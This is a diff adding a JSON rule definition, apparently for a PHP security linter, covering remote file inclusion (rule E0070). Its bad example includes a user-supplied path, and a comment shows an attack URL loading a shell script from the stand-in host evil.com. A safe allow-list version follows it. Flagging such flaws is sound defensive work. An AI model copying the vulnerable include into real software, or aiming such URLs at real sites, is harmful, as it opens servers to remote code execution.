@@ -1,0 +1,14 @@
+{
+  "rule_code": "E0070",
+  "title": "E0070: Remote file inclusion",
+  "plain_english": "",
+  "why_matters": "",
+  "bad_example": "$page = $_GET['page'] ?? '';\ninclude $page; // ?page=http://evil.com/shell.txt",
+  "good_example": "$page = $_GET['page'] ?? '';\n$allowed = ['home', 'about', 'contact'];\nif (!in_array($page, $allowed, true)) {\n    $page = 'home';\n}\ninclude __DIR__ . \"/pages/$page.php\";",
+  "severity": "info",
+  "category": "general",
+  "what_it_checks": [
+    "`include`, `require`, `include_once`, `require_once` where the path is built from user-controlled input",
+    "`file_get_contents()`, `readfile()`, `fopen()` with user-controlled file paths from remote sources"
+  ]
+}
